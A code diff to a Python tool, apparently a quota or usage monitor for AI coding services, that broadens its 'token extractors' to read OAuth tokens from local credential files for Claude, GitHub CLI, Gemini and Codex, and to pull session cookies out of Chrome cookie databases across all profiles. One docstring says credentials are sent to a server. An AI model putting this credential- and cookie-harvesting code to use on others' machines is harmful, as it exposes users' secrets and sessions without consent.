@@ -23,6 +23,7 @@ import socket
 import hmac
 import hashlib
 import time
+import platform
 from pathlib import Path
 from urllib import request, error
 
@@ -78,6 +79,78 @@ def human_delta(target_dt):
     return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
 
 
+# --- Platform Utilities ---
+
+def get_platform_data_dir(app_name: str) -> Path:
+    """Get the platform-specific directory for user data."""
+    system = platform.system()
+    home = Path.home()
+    
+    if system == "Windows":
+        local_app_data = os.getenv("LOCALAPPDATA")
+        if local_app_data:
+            return Path(local_app_data) / app_name
+        return home / "AppData/Local" / app_name
+    elif system == "Darwin":  # macOS
+        return home / "Library/Application Support" / app_name
+    else:  # Linux / Other
+        xdg_data_home = os.getenv("XDG_DATA_HOME")
+        if xdg_data_home:
+            return Path(xdg_data_home) / app_name
+        return home / ".local/share" / app_name
+
+
+def get_platform_config_dir(app_name: str) -> Path:
+    """Get the platform-specific directory for user configuration."""
+    system = platform.system()
+    home = Path.home()
+    
+    if system == "Windows":
+        app_data = os.getenv("APPDATA")
+        if app_data:
+            return Path(app_data) / app_name
+        return home / "AppData/Roaming" / app_name
+    elif system == "Darwin":  # macOS
+        return home / "Library/Application Support" / app_name
+    else:  # Linux / Other
+        xdg_config_home = os.getenv("XDG_CONFIG_HOME")
+        if xdg_config_home:
+            return Path(xdg_config_home) / app_name
+        return home / ".config" / app_name
+
+
+def get_all_chrome_cookies_paths() -> list[Path]:
+    """Get all potential paths to Chrome's Cookies databases across different profiles."""
+    system = platform.system()
+    home = Path.home()
+    paths = []
+    
+    base_dirs = []
+    if system == "Darwin":
+        base_dirs.append(home / "Library/Application Support/Google/Chrome")
+    elif system == "Windows":
+        local_app_data = os.getenv("LOCALAPPDATA")
+        if local_app_data:
+            base_dirs.append(Path(local_app_data) / "Google/Chrome/User Data")
+        else:
+            base_dirs.append(home / "AppData/Local/Google/Chrome/User Data")
+    else:  # Linux
+        base_dirs.append(home / ".config/google-chrome")
+        base_dirs.append(home / ".config/chromium")
+        base_dirs.append(home / "snap/google-chrome/common/.config/google-chrome")
+        base_dirs.append(home / "snap/chromium/common/.config/chromium")
+    
+    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
+    
+    for base in base_dirs:
+        if not base.exists(): continue
+        for profile in profiles:
+            for rel in [profile + "/Network/Cookies", profile + "/Cookies"]:
+                p = base / rel
+                if p.exists(): paths.append(p)
+    return paths
+
+
 # --- Token Extractors ---
 
 class AnthropicCollector:
@@ -117,18 +190,23 @@ class AnthropicCollector:
         # Priority 1: Env var (access token only)
         access_token = os.getenv("CLAUDE_CODE_OAUTH_TOKEN")
         
-        # Priority 2: Credentials file
+        # Priority 2: Credentials file (search multiple locations)
         if not access_token:
-            cred_path = Path.home() / ".claude" / ".credentials.json"
-            if cred_path.exists():
-                try:
-                    with open(cred_path) as f:
-                        data = json.load(f)
-                        oauth_data = data.get("claudeAiOauth", {})
-                        access_token = oauth_data.get("accessToken")
-                        refresh_token = oauth_data.get("refreshToken")
-                except:
-                    pass
+            potential_paths = [
+                Path.home() / ".claude" / ".credentials.json",
+                get_platform_config_dir("claude") / ".credentials.json"
+            ]
+            for cred_path in potential_paths:
+                if cred_path.exists():
+                    try:
+                        with open(cred_path) as f:
+                            data = json.load(f)
+                            oauth_data = data.get("claudeAiOauth", {})
+                            access_token = oauth_data.get("accessToken")
+                            refresh_token = oauth_data.get("refreshToken")
+                            if access_token: break
+                    except:
+                        pass
         
         # Priority 3: macOS Keychain
         if not access_token:
@@ -168,16 +246,21 @@ class GitHubCollector:
         
         # Priority 2: gh CLI config
         if not token:
-            gh_path = Path.home() / ".config" / "gh" / "hosts.yml"
-            if gh_path.exists():
-                try:
-                    import yaml
-                    with open(gh_path) as f:
-                        data = yaml.safe_load(f)
-                        if data and "github.com" in data:
-                            token = data["github.com"].get("oauth_token")
-                except:
-                    pass
+            potential_paths = [
+                Path.home() / ".config" / "gh" / "hosts.yml",
+                get_platform_config_dir("gh") / "hosts.yml"
+            ]
+            for gh_path in potential_paths:
+                if gh_path.exists():
+                    try:
+                        import yaml
+                        with open(gh_path) as f:
+                            data = yaml.safe_load(f)
+                            if data and "github.com" in data:
+                                token = data["github.com"].get("oauth_token")
+                                if token: break
+                    except:
+                        pass
         
         if not token:
             return []
@@ -201,9 +284,18 @@ class GeminiCollector:
     @staticmethod
     def collect():
         """Extract OAuth credentials, send to server for API call."""
-        creds_path = Path.home() / ".gemini" / "oauth_creds.json"
+        potential_paths = [
+            Path.home() / ".gemini" / "oauth_creds.json",
+            get_platform_config_dir("gemini") / "oauth_creds.json"
+        ]
         
-        if not creds_path.exists():
+        creds_path = None
+        for p in potential_paths:
+            if p.exists():
+                creds_path = p
+                break
+        
+        if not creds_path:
             return []
         
         try:
@@ -240,14 +332,19 @@ class ChatGPTCollector:
         
         # Priority 2: Codex auth file
         if not token:
-            auth_path = Path.home() / ".codex" / "auth.json"
-            if auth_path.exists():
-                try:
-                    with open(auth_path) as f:
-                        data = json.load(f)
-                        token = data.get("tokens", {}).get("access_token")
-                except:
-                    pass
+            potential_paths = [
+                Path.home() / ".codex" / "auth.json",
+                get_platform_config_dir("codex") / "auth.json"
+            ]
+            for auth_path in potential_paths:
+                if auth_path.exists():
+                    try:
+                        with open(auth_path) as f:
+                            data = json.load(f)
+                            token = data.get("tokens", {}).get("access_token")
+                            if token: break
+                    except:
+                        pass
         
         if not token:
             return []
@@ -271,38 +368,28 @@ class KimiCollector:
     @staticmethod
     def _get_cookie():
         """Extract kimi-auth from Chrome cookies."""
-        try:
-            # Determine Chrome cookies path
-            if sys.platform == "darwin":
-                path = Path.home() / "Library/Application Support/Google/Chrome/Default/Cookies"
-            elif sys.platform == "win32":
-                path = Path.home() / "AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
-                if not path.exists():
-                    path = Path.home() / "AppData/Local/Google/Chrome/User Data/Default/Cookies"
-            else:
-                path = Path.home() / ".config/google-chrome/Default/Cookies"
-                if not path.exists():
-                    path = Path.home() / ".config/chromium/Default/Cookies"
-            
-            if not path.exists():
-                return None
-            
-            conn = sqlite3.connect(str(path))
-            cursor = conn.cursor()
-            
-            for cookie_name in ["kimi-auth", "kimi_token"]:
-                cursor.execute(
-                    "SELECT value FROM cookies WHERE host_key LIKE '%kimi.com%' AND name = ?",
-                    (cookie_name,)
-                )
-                row = cursor.fetchone()
-                if row:
-                    conn.close()
-                    return row[0]
-            
-            conn.close()
-        except:
-            pass
+        cookies_paths = get_all_chrome_cookies_paths()
+        if not cookies_paths:
+            return None
+        
+        for cookies_path in cookies_paths:
+            try:
+                conn = sqlite3.connect(str(cookies_path))
+                cursor = conn.cursor()
+                
+                for cookie_name in ["kimi-auth", "kimi_token"]:
+                    cursor.execute(
+                        "SELECT value FROM cookies WHERE host_key LIKE '%kimi.com%' AND name = ?",
+                        (cookie_name,)
+                    )
+                    row = cursor.fetchone()
+                    if row:
+                        conn.close()
+                        return row[0]
+                
+                conn.close()
+            except:
+                continue
         return None
     
     @staticmethod
@@ -362,41 +449,30 @@ class OpenCodeCollector:
     
     @staticmethod
     def get_chrome_cookies_path():
-        """Get Chrome cookies database path."""
-        system = sys.platform
-        home = Path.home()
-        
-        if system == "darwin":
-            path = home / "Library/Application Support/Google/Chrome/Default/Cookies"
-        elif system == "win32":
-            path = home / "AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
-            if not path.exists():
-                path = home / "AppData/Local/Google/Chrome/User Data/Default/Cookies"
-        else:
-            path = home / ".config/google-chrome/Default/Cookies"
-            if not path.exists():
-                path = home / ".config/chromium/Default/Cookies"
-        
-        return path if path.exists() else None
+        """Get the first Chrome cookies database path."""
+        paths = get_all_chrome_cookies_paths()
+        return paths[0] if paths else None
     
     @staticmethod
     def get_opencode_session():
-        """Extract opencode.ai session from Chrome."""
-        cookies_path = OpenCodeCollector.get_chrome_cookies_path()
-        if not cookies_path:
+        """Extract opencode.ai session from Chrome (all profiles)."""
+        cookies_paths = get_all_chrome_cookies_paths()
+        if not cookies_paths:
             return None
         
-        try:
-            conn = sqlite3.connect(str(cookies_path))
-            cursor = conn.cursor()
-            cursor.execute(
-                "SELECT value FROM cookies WHERE host_key LIKE '%opencode.ai%' AND name = 'session'"
-            )
-            row = cursor.fetchone()
-            conn.close()
-            return row[0] if row else None
-        except:
-            return None
+        for cookies_path in cookies_paths:
+            try:
+                conn = sqlite3.connect(str(cookies_path))
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT value FROM cookies WHERE host_key LIKE '%opencode.ai%' AND name = 'session'"
+                )
+                row = cursor.fetchone()
+                conn.close()
+                if row: return row[0]
+            except:
+                continue
+        return None
     
     @staticmethod
     def collect():
@@ -420,8 +496,18 @@ class OpenCodeCollector:
             })
         
         # 2. Local DB data
-        db_path = Path.home() / ".local" / "share" / "opencode" / "opencode.db"
-        if db_path.exists():
+        potential_db_paths = [
+            Path.home() / ".local" / "share" / "opencode" / "opencode.db",
+            get_platform_data_dir("opencode") / "opencode.db"
+        ]
+        
+        db_path = None
+        for p in potential_db_paths:
+            if p.exists():
+                db_path = p
+                break
+        
+        if db_path:
             try:
                 conn = sqlite3.connect(str(db_path))
                 cursor = conn.cursor()
@@ -479,8 +565,20 @@ class AntigravityCollector:
     @staticmethod
     def collect():
         """Read local Antigravity quota file."""
-        path = Path.home() / ".antigravity" / "state" / "quota.json"
+        potential_paths = [
+            Path.home() / ".antigravity" / "state" / "quota.json",
+            get_platform_data_dir("antigravity") / "state" / "quota.json"
+        ]
         
+        path = None
+        for p in potential_paths:
+            if p.exists():
+                path = p
+                break
+        
+        if not path:
+            return []
+            
         try:
             with open(path) as f:
                 data = json.load(f)
